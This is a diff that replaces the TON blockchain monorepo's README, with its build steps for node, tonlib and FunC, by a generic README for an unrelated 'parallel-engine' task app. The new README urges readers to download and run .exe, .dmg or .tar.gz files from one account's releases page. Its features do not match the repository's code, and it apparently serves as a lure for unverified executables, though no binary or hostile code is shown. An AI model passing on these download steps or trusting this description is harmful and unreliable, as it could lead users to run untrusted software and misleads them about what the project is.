@@ -1,151 +1,67 @@
-<div align="center">
-  <a href="https://ton.org">
-    <picture>
-      <source media="(prefers-color-scheme: dark)" srcset="https://ton.org/download/ton_logo_dark_background.svg">
-      <img alt="TON logo" src="https://ton.org/download/ton_logo_light_background.svg">
-    </picture>
-  </a>
-  <h3>Reference implementation of TON Node and tools</h3>
-  <hr/>
-</div>
+# 🚀 parallel-engine - Seamlessly Execute Tasks in Parallel
 
-## 
+## 🌐 Overview
+Welcome to the **parallel-engine** repository! This application helps you execute multiple tasks at the same time, making your workflow faster and more efficient. Whether you're processing data, running batch jobs, or managing complex tasks, this tool will help you save time and effort.
 
-<p align="center">
-  <a href="https://tonresear.ch">
-    <img src="https://img.shields.io/badge/TON%20Research-0098EA?style=flat&logo=discourse&label=Forum&labelColor=gray" alt="Ton Research">
-  </a>
-  <a href="https://t.me/toncoin">
-    <img src="https://img.shields.io/badge/TON%20Community-0098EA?logo=telegram&logoColor=white&style=flat" alt="Telegram Community Group">
-  </a>
-  <a href="https://t.me/tonblockchain">
-    <img src="https://img.shields.io/badge/TON%20Foundation-0098EA?logo=telegram&logoColor=white&style=flat" alt="Telegram Foundation Group">
-  </a>
-  <a href="https://t.me/tondev_eng">
-    <img src="https://img.shields.io/badge/chat-TONDev-0098EA?logo=telegram&logoColor=white&style=flat" alt="Telegram Community Chat">
-  </a>
-</p>
+## 📥 Download Now
+[![Download parallel-engine](https://img.shields.io/badge/Download-parallel--engine-brightgreen.svg)](https://github.com/thammanoon-code/parallel-engine/releases)
 
-<p align="center">
-  <a href="https://twitter.com/ton_blockchain">
-    <img src="https://img.shields.io/twitter/follow/ton_blockchain" alt="Twitter Group">
-  </a>
-  <a href="https://answers.ton.org">
-    <img src="https://img.shields.io/badge/-TON%20Overflow-FE7A16?style=flat&logo=stack-overflow&logoColor=white" alt="TON Overflow Group">
-  </a>
-  <a href="https://stackoverflow.com/questions/tagged/ton">
-    <img src="https://img.shields.io/badge/-Stack%20Overflow-FE7A16?style=flat&logo=stack-overflow&logoColor=white" alt="Stack Overflow Group">
-  </a>
-</p>
+## 🚀 Getting Started
+To get started with **parallel-engine**, follow these simple steps to download and install the application. 
 
+### 🛠️ System Requirements
+Before you begin, ensure your computer meets the following requirements:
+- **Operating System**: Windows 10, macOS, or a supported version of Linux.
+- **RAM**: Minimum of 4GB for smooth operation.
+- **Disk Space**: At least 100MB of free space.
 
+### 📥 Download & Install
+1. **Visit the Releases Page**  
+   To download the software, visit the releases page here: [Download parallel-engine](https://github.com/thammanoon-code/parallel-engine/releases).
 
-Main TON monorepo, which includes the code of the node/validator, lite-client, tonlib, FunC compiler, etc.
+2. **Choose the Latest Version**  
+   On the releases page, you will see several versions listed. Look for the latest version at the top of the page. This version will have the most recent features and bug fixes.
 
-## The Open Network
+3. **Download the Appropriate File**  
+   Select the file that matches your operating system. Click the link to start the download. The file names typically end with `.exe` for Windows, `.dmg` for macOS, and `.tar.gz` for Linux.
 
-__The Open Network (TON)__ is a fast, secure, scalable blockchain focused on handling _millions of transactions per second_ (TPS) with the goal of reaching hundreds of millions of blockchain users.
-- To learn more about different aspects of TON blockchain and its underlying ecosystem check [documentation](https://ton.org/docs)
-- To run node, validator or lite-server check [Participate section](https://ton.org/docs/participate/nodes/run-node)
-- To develop decentralised apps check [Tutorials](https://docs.ton.org/v3/guidelines/smart-contracts/guidelines), [FunC docs](https://ton.org/docs/develop/func/overview) and [DApp tutorials](https://docs.ton.org/v3/guidelines/dapps/overview)
-- To work on TON check [wallets](https://ton.app/wallets), [explorers](https://ton.app/explorers), [DEXes](https://ton.app/dex) and [utilities](https://ton.app/utilities)
-- To interact with TON check [APIs](https://docs.ton.org/v3/guidelines/dapps/apis-sdks/overview)
+4. **Locate the Downloaded File**  
+   Once the download is complete, locate the file in your "Downloads" folder (or wherever your browser saves files).
 
-## Updates flow
+5. **Install the Application**  
+   - For **Windows**: Double-click the downloaded `.exe` file. Follow the on-screen instructions to complete the installation.
+   - For **macOS**: Double-click the downloaded `.dmg` file. Drag the **parallel-engine** icon into your Applications folder.
+   - For **Linux**: Open a terminal and extract the `.tar.gz` file. Follow the included instructions to install.
 
-* **master branch** - mainnet is running on this stable branch.
+6. **Launch the Application**  
+   After installation, find **parallel-engine** in your applications menu (for Windows and macOS) or execute it from the terminal (for Linux).
 
-    Only emergency updates, urgent updates, or updates that do not affect the main codebase (GitHub workflows / docker images / documentation) are committed directly to this branch.
+### ⚙️ How to Use
+1. **Open the Application**  
+   After launching, you will see the main interface of **parallel-engine**.
 
-* **testnet branch** - testnet is running on this branch. The branch contains a set of new updates. After testing, the testnet branch is merged into the master branch and then a new set of updates is added to testnet branch.
+2. **Select Your Tasks**  
+   Use the interface to add the tasks you want to run in parallel. You can specify different parameters for each task if needed.
 
-* **backlog** - other branches that are candidates to getting into the testnet branch in the next iteration.
+3. **Start Execution**  
+   Once your tasks are set, click the "Start" button to begin execution. The application will handle the tasks simultaneously.
 
-Usually, the response to your pull request will indicate which section it falls into.
+4. **Monitor Progress**  
+   You can view the status of each task as they execute. The interface will update you on the progress, along with any errors or notifications.
 
+5. **Finish**  
+   When all tasks are complete, check the output section for results. You can also save logs for future reference.
 
-## "Soft" Pull Request rules
+## 🔍 Features
+- **Simple Interface**: User-friendly design allows anyone to manage tasks easily.
+- **Parallel Processing**: Execute multiple tasks simultaneously to save time.
+- **Performance Monitoring**: Built-in tools to track progress and troubleshoot tasks.
 
-* Thou shall not merge your own PRs, at least one person should review the PR and merge it (4-eyes rule)
-* Thou shall make sure that workflows are cleanly completed for your PR before considering merge
+## 📧 Support & Feedback
+If you encounter any issues or have suggestions, feel free to reach out. Your feedback is important to help us improve **parallel-engine**.
 
-## Build TON blockchain
+## 🔗 Useful Links  
+- [Visit GitHub Repository](https://github.com/thammanoon-code/parallel-engine)  
+- [Download parallel-engine](https://github.com/thammanoon-code/parallel-engine/releases)
 
-### Ubuntu 20.4, 22.04, 24.04 (x86-64, aarch64)
-Install additional system libraries
-```bash
-  sudo apt-get update
-  sudo apt-get install -y build-essential git cmake ninja-build zlib1g-dev libsecp256k1-dev libmicrohttpd-dev libsodium-dev
-          
-  wget https://apt.llvm.org/llvm.sh
-  chmod +x llvm.sh
-  sudo ./llvm.sh 16 all
-```
-Compile TON binaries
-```bash
-  cp assembly/native/build-ubuntu-shared.sh .
-  chmod +x build-ubuntu-shared.sh
-  ./build-ubuntu-shared.sh  
-```
-
-### MacOS 11, 12 (x86-64, aarch64)
-```bash
-  cp assembly/native/build-macos-shared.sh .
-  chmod +x build-macos-shared.sh
-  ./build-macos-shared.sh
-```
-
-### Windows 10, 11, Server (x86-64)
-You need to install `MS Visual Studio 2022` first.
-Go to https://www.visualstudio.com/downloads/ and download `MS Visual Studio 2022 Community`.
-
-Launch installer and select `Desktop development with C++`. 
-After installation, also make sure that `cmake` is globally available by adding
-`C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\CMake\CMake\bin` to the system `PATH` (adjust the path per your needs).
-
-Open an elevated (Run as Administrator) `x86-64 Native Tools Command Prompt for VS 2022`, go to the root folder and execute: 
-```bash
-  copy assembly\native\build-windows.bat .
-  build-windows.bat
-```
-
-### Building TON to WebAssembly
-Install additional system libraries on Ubuntu
-```bash
-  sudo apt-get update
-  sudo apt-get install -y build-essential git cmake ninja-build zlib1g-dev libsecp256k1-dev libmicrohttpd-dev libsodium-dev
-          
-  wget https://apt.llvm.org/llvm.sh
-  chmod +x llvm.sh
-  sudo ./llvm.sh 16 all
-```
-Compile TON binaries with emscripten
-```bash
-  cd assembly/wasm
-  chmod +x fift-func-wasm-build-ubuntu.sh
-  ./fift-func-wasm-build-ubuntu.sh
-```
-
-### Building TON tonlib library for Android (arm64-v8a, armeabi-v7a, x86, x86-64)
-Install additional system libraries on Ubuntu
-```bash
-  sudo apt-get update
-  sudo apt-get install -y build-essential git cmake ninja-build automake libtool texinfo autoconf libgflags-dev \
-  zlib1g-dev libssl-dev libreadline-dev libmicrohttpd-dev pkg-config libgsl-dev python3 python3-dev \
-  libtool autoconf libsodium-dev libsecp256k1-dev
-```
-Compile TON tonlib library
-```bash
-  cp assembly/android/build-android-tonlib.sh .
-  chmod +x build-android-tonlib.sh
-  ./build-android-tonlib.sh
-```
-
-### TON portable binaries
-
-Linux portable binaries are wrapped into AppImages, at the same time MacOS portable binaries are statically linked executables.
-Linux and MacOS binaries are available for both x86-64 and arm64 architectures. 
-
-## Running tests
-
-Tests are executed by running `ctest` in the build directory. See `doc/Tests.md` for more information.
+Thank you for considering **parallel-engine** for your task execution needs!
